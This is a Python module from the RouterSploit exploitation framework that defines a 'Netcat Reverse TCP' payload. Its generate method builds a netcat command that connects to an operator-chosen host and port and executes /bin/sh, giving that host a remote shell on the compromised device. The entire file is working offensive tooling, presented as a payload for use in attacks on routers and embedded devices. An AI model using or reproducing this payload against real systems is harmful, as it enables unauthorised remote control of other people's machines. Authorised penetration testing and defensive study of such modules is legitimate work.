from routersploit import exploits
from routersploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Exploit(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        'name': 'Netcat Reverse TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }
    netcat_binary = exploits.Option('/bin/nc', 'Netcat binary')
    shell_binary = exploits.Option('/bin/sh', 'Shell')

    def generate(self):
        return "{} {} {} -e {}".format(self.netcat_binary,
                                       self.lhost,
                                       self.lport,
                                       self.shell_binary)
